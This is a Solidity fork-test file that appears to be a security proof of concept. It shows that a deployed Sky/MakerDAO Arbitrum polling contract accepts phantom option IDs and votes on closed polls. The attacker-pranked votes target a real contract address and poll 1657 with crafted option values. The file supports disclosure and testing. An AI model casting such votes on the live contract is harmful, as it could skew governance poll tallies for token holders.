// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import "forge-std/Test.sol";

interface IPolling {
    function createPoll(uint256 startDate, uint256 endDate, string calldata multiHash, string calldata url) external;
    function vote(uint256[] calldata pollIds, uint256[] calldata optionIds) external;
    function npoll() external view returns (uint256);
    function name() external view returns (string memory);
    function version() external view returns (string memory);
}

/// @title S-P2-4 — Sky vote.sky.money polling contract: phantom-option votes
/// @notice Fork test against the deployed Arbitrum polling contract
///         0x4f4e551b4920a5417F8d4e7f8f099660dAdadcEC (Polling.sol, solc 0.6.6,
///         istanbul, optimizer off — Sourcify full match).
///         The contract stores NO options on-chain (createPoll takes only a
///         window + IPFS multihash); vote() checks ONLY that the two arrays
///         have equal length, then emits Voted(voter, pollId, optionId) for
///         whatever uint256 optionId it is given. The portal tally
///         (fetchPollTally) never validates that a ballot option exists in
///         poll.options, so a phantom option can be declared the winner.
///         This file proves the on-chain half; the tally half is proven by
///         the real portal code in fetchTallyPhantomOption.spec.ts
///         (vitest, mockTallyIndexer) in the sky-gov-portal repo.
contract SP24PhantomVoteTest is Test {
    IPolling constant POLLING = IPolling(0x4f4e551b4920a5417F8d4e7f8f099660dAdadcEC);

    // Real poll seen live on vote.sky.money (posted Nov 09 2026).
    uint256 constant REAL_POLL_ID = 1657;

    address constant ATTACKER = address(0xA77A);
    address constant HONEST = address(0xBEEF);

    event Voted(address indexed voter, uint256 indexed pollId, uint256 indexed optionId);
    event PollCreated(
        address indexed creator,
        uint256 blockCreated,
        uint256 indexed pollId,
        uint256 startDate,
        uint256 endDate,
        string multiHash,
        string url
    );

    function _vote(uint256 pollId, uint256 optionId) internal {
        uint256[] memory p = new uint256[](1);
        uint256[] memory o = new uint256[](1);
        p[0] = pollId;
        o[0] = optionId;
        POLLING.vote(p, o);
    }

    function _votedLog(uint256 pollId, uint256 optionId, address voter) internal returns (bytes32[] memory topics) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics.length == 4 && logs[i].topics[0] == keccak256("Voted(address,uint256,uint256)")) {
                return logs[i].topics;
            }
        }
        revert("no Voted log found");
    }

    function testContractIdentity() public view {
        assertEq(POLLING.name(), "MakerDAO Polling");
        assertEq(POLLING.version(), "Arbitrum.1");
        uint256 n = POLLING.npoll();
        assertGt(n, REAL_POLL_ID); // 1657 exists on-chain
    }

    function testPhantomOptionVoteOnFreshPoll() public {
        uint256 start = block.timestamp;
        uint256 end = block.timestamp + 3 days;
        vm.recordLogs();
        vm.prank(ATTACKER);
        POLLING.createPoll(start, end, "QmTest", "https://example.com/poll");
        uint256 pollId = POLLING.npoll() - 1;

        vm.recordLogs();
        vm.prank(ATTACKER);
        _vote(pollId, 99);
        bytes32[] memory t = _votedLog(pollId, 99, ATTACKER);
        assertEq(address(uint160(uint256(t[1]))), ATTACKER);
        assertEq(uint256(t[2]), pollId);
        assertEq(uint256(t[3]), 99);
    }

    function testPhantomOptionVoteOnRealPoll1657() public {
        // Poll 1657's window has ended; vote() enforces no window, so a
        // phantom option is still emittable against a real poll.
        vm.recordLogs();
        vm.prank(ATTACKER);
        _vote(REAL_POLL_ID, 99);
        bytes32[] memory t = _votedLog(REAL_POLL_ID, 99, ATTACKER);
        assertEq(uint256(t[3]), 99);
    }

    function testPhantomOptionMaxUint() public {
        vm.recordLogs();
        vm.prank(ATTACKER);
        _vote(REAL_POLL_ID, type(uint256).max);
        bytes32[] memory t = _votedLog(REAL_POLL_ID, type(uint256).max, ATTACKER);
        assertEq(uint256(t[3]), type(uint256).max);
    }

    function testDuplicatedByteBallotStillEmittedRaw() public {
        // 0x0101010101010101: the #82775 amplification payload. The contract
        // emits it verbatim; only the portal's parseRawOptionId dedups it.
        uint256 raw = 72340172838076673; // 0x0101010101010101
        vm.recordLogs();
        vm.prank(ATTACKER);
        _vote(REAL_POLL_ID, raw);
        bytes32[] memory t = _votedLog(REAL_POLL_ID, raw, ATTACKER);
        assertEq(uint256(t[3]), raw);
    }

    function testMultiOptionRawStillEmittedRaw() public {
        // 513 == 0x0201 -> portal decodes ballot [1, 2]; single-choice guard
        // discards it tally-side, but the contract emits it without complaint.
        vm.recordLogs();
        vm.prank(ATTACKER);
        _vote(REAL_POLL_ID, 513);
        bytes32[] memory t = _votedLog(REAL_POLL_ID, 513, ATTACKER);
        assertEq(uint256(t[3]), 513);
    }

    function testHonestVoteControl() public {
        vm.recordLogs();
        vm.prank(HONEST);
        _vote(REAL_POLL_ID, 1);
        bytes32[] memory t = _votedLog(REAL_POLL_ID, 1, HONEST);
        assertEq(uint256(t[3]), 1);
    }

    function testMismatchedLengthsRevertControl() public {
        uint256[] memory p = new uint256[](1);
        uint256[] memory o = new uint256[](2);
        p[0] = REAL_POLL_ID;
        o[0] = 1;
        o[1] = 2;
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("non-matching-length"));
        POLLING.vote(p, o);
    }
}
